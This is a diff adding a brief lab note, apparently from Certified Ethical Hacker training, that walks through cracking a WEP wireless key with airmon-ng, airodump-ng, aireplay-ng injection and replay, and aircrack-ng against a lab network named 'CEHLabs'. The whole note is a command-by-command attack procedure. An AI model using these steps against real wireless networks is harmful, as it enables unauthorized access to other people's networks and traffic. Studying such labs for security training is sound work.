@@ -1,0 +1,28 @@
+1- Cracking a WEP Network with Aircrack-ng 
+WEP uses a 24-bit initialization vector (IV) to form a stream cipher RC4 for confidentiality, and CRC-32 checksum for integirty of wireless transmission. 
+in Kali Linux: 
+type: airmon-ng
+
+airmon-ng start wlan0
+airodump-ng wlan0mon
+
+aireplay-ng -9 -e CEHLabs -a 20:E5:2a wlan0mon 
+a is for injection Test
+
+-e CEHLabs is Wireless Netowrk Name
+-a 20:E5 is the MAC address of the Access Point
+wlan0mon is the wirelss interface name
+
+And now in a new terminal type
+
+airodump-ng --bssid (mac address of the access point) -c 7 -w WEPcrack wlan0mon0
+
+Next, we need to generate traffic between the AP and the station. In a new termianl type: 
+
+aireplay-ng -3 -b (mac address) -h (mac address of the station) wlan0mon
+
+aireplay-ng -1 0 -e CEHLabs -a (mac addr) -h (mac add) wlan0mon
+
+Note: Capture about 15,000 - 20,000 packets then press CTRL+C. 
+
+Launch aircrack-ng WEPcrack-01.cap. And this will find us the key.
